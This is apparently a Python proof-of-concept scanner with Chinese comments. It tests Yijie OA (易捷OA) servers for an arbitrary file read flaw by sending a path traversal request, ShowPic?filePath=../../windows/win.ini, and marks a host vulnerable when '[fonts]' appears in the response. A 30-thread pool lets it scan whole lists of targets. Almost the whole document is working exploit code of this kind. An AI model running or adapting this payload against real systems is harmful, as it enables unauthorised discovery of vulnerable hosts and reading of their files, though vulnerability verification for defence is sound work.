# 作者：Affection
# 开发日期：2024/12/19
import  requests,sys,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def check(target):
    try:
        headers = {
            'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101Firefox / 120.0',
            'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        }

        url = 'http://' + target + '/servlet/ShowPic?filePath=../../windows/win.ini'
        response = requests.get(url,headers = headers,verify = False,timeout = 5)
        try:
            if response.status_code == 200 and '[fonts]' in response.text:
                print('[+] 存在漏洞！！！' + target)
            else:
                print('[-] 不存在漏洞 ' + target)
        except Exception as e:
            print("TimeOut!")

    except Exception as e:
        print(e)

def main():
    parse = argparse.ArgumentParser("易捷OA ShowPic 任意文件读取漏洞验证")
    # 命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help='输入目标url地址')
    parse.add_argument('-f','--file',dest='file',type=str,help='导入目标文件')
    # 实例化
    args = parse.parse_args()
    # 添加线程池
    pool = Pool(30)
    try:
        if args.url:
            check(args.url)
        else:
            targets = []
            f = open(args.file,'r+')
            for target in f.readlines():
                target = target.strip()
                targets.append(target)
            pool.map(check,targets)
    except Exception as e:
        print("url错误或文件不存在，请检查输入内容是否正确！")


if __name__ == '__main__':
    main()
